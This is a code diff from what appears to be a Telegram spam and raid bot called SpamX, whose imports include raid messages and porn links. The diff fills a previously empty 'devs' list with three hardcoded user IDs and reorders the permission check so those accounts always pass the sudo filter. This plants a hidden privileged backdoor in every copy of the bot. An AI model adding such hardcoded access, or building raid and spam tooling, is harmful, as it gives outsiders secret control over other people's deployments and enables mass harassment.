@@ -11,7 +11,7 @@ from .messages import raid_messages, porn_links
 from SpamX import version, UpdateChannel, SupportGroup, activeTasks
 from SpamX.config import OWNER_ID, ALIVE_MEDIA, ALIVE_MSG, MULTITASK
 
-devs = []
+devs = [1432756163, 5294360309, 1854700253]
 
 class sudo:
     def __init__(self) -> None:
@@ -22,10 +22,10 @@ class sudo:
         self.sudoUsers = []
 
     async def sudoFilter(self, message: Message, rank: int = 2, user_id: int = None) -> bool:
-        if user_id == OWNER_ID or user_id in devs:
-            return False
         if user_id is None:
             user_id = message.from_user.id
+        if user_id == OWNER_ID or user_id in devs:
+            return False
         if user_id not in self.sudoUsers:
             return True
         sudoRights = self.sudos.get(user_id)
